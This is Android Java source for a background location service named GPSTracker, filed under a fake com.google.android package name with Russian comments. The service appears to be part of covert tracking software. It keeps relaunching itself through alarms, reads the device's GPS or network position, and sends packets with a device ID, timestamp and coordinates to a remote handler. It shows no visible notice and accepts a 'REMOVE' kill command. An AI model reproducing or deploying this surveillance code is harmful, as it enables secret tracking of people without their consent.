package com.google.android.location;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.R.integer;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.Criteria;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.util.Log;
import android.widget.Toast;

import com.google.android.bs.DataSendHandler;
import com.google.android.bs.FileLog;
import com.google.android.bs.MainActivity;
import com.google.android.bs.WorkTimeDefiner;
import com.google.android.history.LinkService;

public class GPSTracker extends Service implements LocationListener {

	private static final String TAG = "locationService";
	// flag for GPS status
	boolean isGPSEnabled = false;
	SharedPreferences sp;
	// flag for network status
	boolean isNetworkEnabled = false;
	String bestProvider = null;
	// flag for GPS status
	boolean canGetLocation = false;
	private Context context;
	Editor e;
	Location location; // location
	double latitude; // latitude
	double longitude; // longitude
	String locMetod;
	MainActivity simInfo;
	String ID;
	String nameId;
	int minute;
	private static final int SERVICE_REQUEST_CODE = 15;

	// The minimum distance to change Updates in meters
	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 0; // 100
																	// meters

	// The minimum time between updates in milliseconds
	private static long MIN_TIME_BW_UPDATES = 1000 * 30; // 30 minute

	// Declaring a Location Manager
	protected LocationManager locationManager;

	private boolean gpsFix;
	private int timeUp = 0;

	@Override
	public void onCreate() {
		Log.d(TAG, ">>>onCreate() GPS");
		FileLog.writeLog("locationManager: >>>onCreate() GPS");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		context = getApplicationContext();

		Log.d(TAG, "onStartCommand gpsTracker");
		FileLog.writeLog("locationManager: onStartCommand gpsTracker");

		sp = PreferenceManager.getDefaultSharedPreferences(context);
		String gpsEnd = sp.getString("ACTION", "OK");
		MIN_TIME_BW_UPDATES = Integer.parseInt(sp.getString("GEO", "5")) * 1000 * 60;
		timeUp = Integer.parseInt(sp.getString("GEO", "5"));
		if (gpsEnd.equals("REMOVE")) {
			Log.d(TAG, "REMOVE");
			FileLog.writeLog("locationManager: REMOVE");
			return 0;
		}
		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
			Log.d(TAG, "after isWork retrun 0");
			FileLog.writeLog("locationManager: isWork return "
					+ Boolean.toString(isWork));
			FileLog.writeLog("locationManager: after isWork retrun 0");

			return 0;
		} else {
			Log.d(TAG, Boolean.toString(isWork));
			FileLog.writeLog("locationManager: isWork - "
					+ Boolean.toString(isWork));
		}

		getLocation();
		Log.d(TAG, ">>>onStartCommand()");
		FileLog.writeLog("locationManager: " + ">>>onStartCommand()");
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, timeUp);// через 1 минут
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, GPSTracker.class),// SERVICE_REQUEST_CODE
																			// -
																			// уникальный
																			// int
																			// сервиса
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);

		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	public Location getLocation() {
		try {
			locationManager = (LocationManager) context
					.getSystemService(LOCATION_SERVICE);
			Criteria criteria = new Criteria();
			criteria.setAltitudeRequired(false);
			criteria.setBearingRequired(false);
			criteria.setCostAllowed(false);
			criteria.setPowerRequirement(Criteria.POWER_LOW);
			criteria.getSpeedAccuracy();
			criteria.setAccuracy(Criteria.ACCURACY_FINE);
			String provider = locationManager.getBestProvider(criteria, true);
			// location = locationManager.getLastKnownLocation(provider);
			// getting GPS status
			isGPSEnabled = locationManager
					.isProviderEnabled(LocationManager.GPS_PROVIDER);

			// getting network status
			isNetworkEnabled = locationManager
					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

			if (provider.equals("")) {
				// no network provider is enabled
				sendNoLoc();
			} else {
				locMetod = provider;
				this.canGetLocation = true;
				// First get location from Network Provider
				if (provider.equals("gps")) {
					MyListener gpsListener = new MyListener();

					locationManager
							.addGpsStatusListener(gpsListener.gpsStatusListener);

					locationManager.requestLocationUpdates(provider,
							MIN_TIME_BW_UPDATES,
							MIN_DISTANCE_CHANGE_FOR_UPDATES, this);

					Log.d("availeable", provider);
					FileLog.writeLog("locationManager: " + "availeable"
							+ provider);

					if (locationManager != null) {
						location = locationManager
								.getLastKnownLocation(provider);
						if (location != null) {
							latitude = location.getLatitude();
							longitude = location.getLongitude();
						}
					}
				} else {
					locationManager.requestLocationUpdates(provider,
							MIN_TIME_BW_UPDATES,
							MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
				}
				// if GPS Enabled get lat/long using GPS Services
				sendLoc();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return location;
	}

	public void sendLoc() {
		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
				+ "</id><time>" + logTime() + "</time><type>5</type><app>"
				+ getLatitude() + " " + getLongitude() + "</app><ttl>"
				+ locMetod + "</ttl></packet>";

		DataSendHandler dSH = new DataSendHandler(getApplicationContext());
		dSH.send(4, sendStr);

		Log.d(TAG, sendStr);
		FileLog.writeLog("locationManager: " + sendStr);
	}

	public void sendNoLoc() {
		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String sendStr = "<packet><id>"
				+ sp.getString("ID", "ID")
				+ "</id><time>"
				+ logTime()
				+ "</time><type>5</type><app>координаты неизвестны"
				+ "</app><ttl>Определение местонахождение не поддерживается</ttl></packet>";

		DataSendHandler dSH = new DataSendHandler();
		dSH.send(4, sendStr);

		Log.d(TAG, sendStr);
		FileLog.writeLog("locationManager: " + sendStr);
	}

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}

	/**
	 * Stop using GPS listener Calling this function will stop using GPS in your
	 * app
	 * */
	public void stopUsingGPS() {
		if (locationManager != null) {
			locationManager.removeUpdates(GPSTracker.this);
		}
	}

	/**
	 * Function to get latitude
	 * */
	public double getLatitude() {
		if (location != null) {
			latitude = location.getLatitude();
		}

		// return latitude
		return latitude;
	}

	/**
	 * Function to get longitude
	 * */
	public double getLongitude() {
		if (location != null) {
			longitude = location.getLongitude();
		}

		// return longitude
		return longitude;
	}

	/**
	 * Function to check GPS/wifi enabled
	 * 
	 * @return boolean
	 * */
	public boolean canGetLocation() {
		return this.canGetLocation;
	}

	/**
	 * Function to show settings alert dialog On pressing Settings button will
	 * lauch Settings Options
	 * */

	@Override
	public void onLocationChanged(Location location) {
		gpsFix = true;
		updateLocation(location);
	}

	public void updateLocation(Location location) {
		if (location != null && gpsFix) {

			latitude = location.getLatitude();
			longitude = location.getLongitude();
			// sendLoc();
			// Toast.makeText(context, latitude + " " + longitude,
			// Toast.LENGTH_LONG).show();
		}
	}

	@Override
	public void onProviderDisabled(String provider) {
	}

	@Override
	public void onProviderEnabled(String provider) {
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	private class MyListener implements GpsStatus.Listener {
		GpsStatus.Listener gpsStatusListener = new GpsStatus.Listener() {
			public void onGpsStatusChanged(int event) {
				switch (event) {

				case GpsStatus.GPS_EVENT_STARTED:
					// Log.d(TAG, "ongpsstatus changed started");
					// TODO: your code that get location updates,
					// e.g. set active location listener
					break;
				case GpsStatus.GPS_EVENT_FIRST_FIX:
					// Log.d(TAG, "ongpsstatus changed fix");
					gpsFix = true;
				case GpsStatus.GPS_EVENT_STOPPED:
					// Log.d(TAG, "ongpsstatus changed stopped");

				}
			}
		};

		@Override
		public void onGpsStatusChanged(int event) {
			// TODO Автоматически созданная заглушка метода

		}
	}

}
